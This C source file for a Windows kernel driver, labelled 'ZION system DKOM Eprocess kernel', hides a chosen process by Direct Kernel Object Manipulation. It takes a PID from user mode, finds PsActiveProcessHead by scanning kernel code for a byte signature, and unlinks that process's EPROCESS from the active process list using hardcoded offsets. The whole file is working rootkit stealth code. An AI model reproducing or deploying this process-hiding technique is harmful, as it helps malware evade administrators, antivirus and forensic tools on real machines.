/*
 *      name: ZION system DKOM Eprocess kernel
 *      Org Author: Liang Chen
 *      Version : 0.2
 */
#include "zion_dkom_eprocess_impl.h"

BOOL DKOM_EPROCESS_SERVER(PVOID ptrBufferAddr)
{
	//safe_trace("%x",PsGetCurrentPrYocess());
	//PVOID 
	//PLIST_ENTRY aaa=PsActiveProcessHead;
	PLIST_ENTRY Zion_PsActiveProcessHead = 0;
	PEPROCESS Zion_SystemProcess = NULL;
	PVOID ptrProxyDKOMPacketData = ExAllocatePool(
												PagedPool,
												sizeof(ZION_DKOM_EPROCESS_CMD_DATA)
												);

	if (NULL == ptrProxyDKOMPacketData)
	{
		safe_trace("ZION_SERVER: alloc memory error.\n");
		return 0;
	}
	if (1 != Safe_CopyMemFromUser((PZION_DKOM_EPROCESS_CMD_DATA)((PZION_CS_PACKET)ptrBufferAddr)->pData,
						   sizeof(ZION_DKOM_EPROCESS_CMD_DATA),
						   ptrProxyDKOMPacketData))
	{
		safe_trace("ZION_SERVER: Copy Data error.\n");
		return 0;
	}
	if (FALSE == GetPsActiveProcessHeadAddr(&Zion_PsActiveProcessHead))
	{
		safe_trace("ZION_SERVER: Get PsActiveProcessHead error\n");
		return 0;
	}
	Zion_SystemProcess = (PEPROCESS)((DWORD)Zion_PsActiveProcessHead - GetEPROCESSOffset(ZION_EPROCESS_ACTIVE_LINK));
	if (FALSE == DKOM_HideProcessByPid(Zion_SystemProcess, ((PZION_DKOM_EPROCESS_CMD_DATA)ptrProxyDKOMPacketData)->pid))
	{
		safe_trace("ZION_SERVER: No pid found, error hiding\n");
		return 0;
	}
	ExFreePool(ptrProxyDKOMPacketData);
	return 1;
}
BOOL DKOM_HideProcessByPid(PEPROCESS ptrSystem, DWORD pid)
{
	PEPROCESS ptrPrev = NULL;
	PEPROCESS ptrCurr = NULL;
	PEPROCESS ptrNext = NULL;
	PMDL ptrCurrProcessMDL;
	PMDL ptrPrevProcessMDL;
	PMDL ptrNextProcessMDL;
	if (NULL == ptrSystem)
	{
		safe_trace("ZION_SERVER: error argu in DKOM_HideProcessByPid\n");
		return 0;
	}
	ptrCurr = ptrSystem;
	while (ptrCurr != NULL)
	{
		ptrCurrProcessMDL = IoAllocateMdl(ptrCurr, 
			4096, 
			FALSE, 
			FALSE, 
			NULL); 

		if(!ptrCurrProcessMDL) 
		{ 
			safe_trace("ZION_SERVER: AllocMdl ERROR.\n");
			return -1; 
		} 

		MmProbeAndLockPages(ptrCurrProcessMDL,
			KernelMode,
			IoModifyAccess
			);
		if (*(DWORD *)((BYTE *)ptrCurr + GetEPROCESSOffset(ZION_EPROCESS_PID)) == pid)//若是待隐藏进程
		{
			ptrPrev = (PEPROCESS)((BYTE *)(((PLIST_ENTRY)((BYTE *)ptrCurr + GetEPROCESSOffset(ZION_EPROCESS_ACTIVE_LINK)))-> Blink) - GetEPROCESSOffset(ZION_EPROCESS_ACTIVE_LINK));
			//找到前节点
			ptrPrevProcessMDL = IoAllocateMdl(ptrPrev, 
				4096, 
				FALSE, 
				FALSE, 
				NULL); 
			if(!ptrPrevProcessMDL) 
			{ 
				safe_trace("ZION_SERVER: AllocMdl ERROR.\n");
				return -1; 
			}
			MmProbeAndLockPages(ptrPrevProcessMDL,
				KernelMode,
				IoModifyAccess
				);
			((PLIST_ENTRY)((BYTE *)ptrPrev + GetEPROCESSOffset(ZION_EPROCESS_ACTIVE_LINK)))->Flink = ((PLIST_ENTRY)((BYTE *)ptrCurr + GetEPROCESSOffset(ZION_EPROCESS_ACTIVE_LINK)))-> Flink;
			//修改前节点的后继节点
			if (NULL != ((PLIST_ENTRY)((BYTE *)ptrCurr + GetEPROCESSOffset(ZION_EPROCESS_ACTIVE_LINK)))-> Flink)
			{
				ptrNext = (PEPROCESS)((BYTE *)(((PLIST_ENTRY)((BYTE *)ptrCurr + GetEPROCESSOffset(ZION_EPROCESS_ACTIVE_LINK)))-> Flink) - GetEPROCESSOffset(ZION_EPROCESS_ACTIVE_LINK));
				//找到后继节点
				ptrNextProcessMDL = IoAllocateMdl(ptrNext, 
													4096, 
													FALSE, 
													FALSE, 
													NULL); 
				if(!ptrNextProcessMDL) 
				{ 
					safe_trace("ZION_SERVER: AllocMdl ERROR.\n");
					return -1; 
				}
				MmProbeAndLockPages(ptrNextProcessMDL,
										KernelMode,
										IoModifyAccess
										);
				((PLIST_ENTRY)((BYTE *)ptrNext + GetEPROCESSOffset(ZION_EPROCESS_ACTIVE_LINK)))->Blink = ((PLIST_ENTRY)((BYTE *)ptrCurr + GetEPROCESSOffset(ZION_EPROCESS_ACTIVE_LINK)))-> Blink;
				//修改后继节点的前驱节点
				MmUnlockPages(ptrNextProcessMDL);
				IoFreeMdl(ptrNextProcessMDL);
			}
			MmUnlockPages(ptrPrevProcessMDL);
			IoFreeMdl(ptrPrevProcessMDL);
			break;
		}
		ptrCurr = (PEPROCESS)((BYTE *)(((PLIST_ENTRY)((BYTE *)ptrCurr + GetEPROCESSOffset(ZION_EPROCESS_ACTIVE_LINK))) -> Flink) - GetEPROCESSOffset(ZION_EPROCESS_ACTIVE_LINK));
		MmUnlockPages(ptrCurrProcessMDL);
		IoFreeMdl(ptrCurrProcessMDL);
	}
	if (ptrCurr == NULL) return FALSE;
	else 
	{
		MmUnlockPages(ptrCurrProcessMDL);
		IoFreeMdl(ptrCurrProcessMDL);
		return TRUE;
	}

}
BOOL GetPsActiveProcessHeadAddr(PLIST_ENTRY *Head)
{
	PVOID ptrKeCapturePersistentThreadState;
	UNICODE_STRING  wcsKeCapturePersistentThreadState;
	int dwBytePassed;
	BYTE * ptrCurrent;
	RtlInitUnicodeString (&wcsKeCapturePersistentThreadState, 
						  L"KeCapturePersistentThreadState");

	ptrKeCapturePersistentThreadState = MmGetSystemRoutineAddress( &wcsKeCapturePersistentThreadState);
	//获得KeCapturePersistentThreadState例程的入口地址
	for (dwBytePassed = 0, ptrCurrent = (BYTE *)ptrKeCapturePersistentThreadState; dwBytePassed < 4096 ;dwBytePassed++ ,ptrCurrent++)
	{
		if ((*ptrCurrent == 0xA1) && (*(ptrCurrent+8) ==0xc7) && (*(ptrCurrent+9) ==0x43)
			&& (*(ptrCurrent+0xa) ==0x18) && (*(ptrCurrent+0xf) ==0xc7) && (*(ptrCurrent+0x10) ==0x43) 
			&& (*(ptrCurrent+0x11) ==0x1c))
		break; //搜索特征码
	}
	if (dwBytePassed == 4096) return FALSE;//未找到
	*Head =  *(PLIST_ENTRY *)(*(DWORD *)(ptrCurrent + 0x12));//找到
	return TRUE;
}
DWORD GetEPROCESSOffset(DWORD signature)
{
	switch (signature)
	{
		case ZION_EPROCESS_ACTIVE_LINK:
			return 0x88;
			break;
		case ZION_EPROCESS_PID:
			return 0x84;
			break;
		default:
			return 0x00;
			break;
	}
}